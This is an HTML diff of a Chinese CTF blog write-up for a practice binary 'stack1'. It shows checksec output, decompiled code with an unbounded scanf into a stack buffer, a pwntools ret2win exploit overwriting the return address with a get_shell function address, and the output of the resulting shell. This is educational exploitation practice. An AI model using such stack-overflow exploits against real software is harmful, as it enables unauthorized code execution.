@@ -490,12 +490,54 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ checksec stack1</div><div class="line">[*] <span class="string">'/home/ios/stack1'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure>
-<p>开启NX保护<br>IAD载入分析代码<br>main()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">&#123;</div><div class="line">  char v4; // [rsp+0h] [rbp-20h]</div><div class="line"></div><div class="line">  puts(&quot;get input&quot;);</div><div class="line">  scanf(&quot;%s&quot;, &amp;v4);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>get_shell()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">int get_shell()</div><div class="line">&#123;</div><div class="line">  return system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>简单栈溢出 已给shell 所以覆盖v4之后ret到get_shell 地址即可<br>exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./stack1'</span>)</div><div class="line">sys_addr=<span class="number">0x000000000004005B6</span></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span> +<span class="string">'b'</span>*<span class="number">8</span> +p64(sys_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
-<p>成功取得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ python stack1.py</div><div class="line">[+] Starting local process &apos;./stack1&apos;: pid 2228</div><div class="line">[*] Switching to interactive mode</div><div class="line">get input</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">$ </div><div class="line">[*] Interrupted</div><div class="line">[*] Stopped process &apos;./stack1&apos; (pid 2228)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure></p>
+        <h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec stack1
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/stack1'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
+ios@ubuntu:~$
+</code></pre>
+<p>开启NX保护<br>IAD载入分析代码<br>main()</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4; // [rsp+0h] [rbp-20h]
 
+  puts(&quot;get input&quot;);
+  scanf(&quot;%s&quot;, &amp;v4);
+  return 0;
+}
+</code></pre><p>get_shell()</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>int get_shell()
+{
+  return system(&quot;/bin/sh&quot;);
+}
+</code></pre><p>简单栈溢出 已给shell 所以覆盖v4之后ret到get_shell 地址即可<br>exp</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stack1'</span><span class="token punctuation">)</span>
+sys_addr<span class="token operator">=</span><span class="token number">0x000000000004005B6</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>成功取得shell</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>ios@ubuntu:~$ python stack1.py
+[+] Starting local process &#39;./stack1&#39;: pid 2228
+[*] Switching to interactive mode
+get input
+$ ls
+flag
+$ 
+[*] Interrupted
+[*] Stopped process &#39;./stack1&#39; (pid 2228)
+ios@ubuntu:~$
+</code></pre>
     
 
     
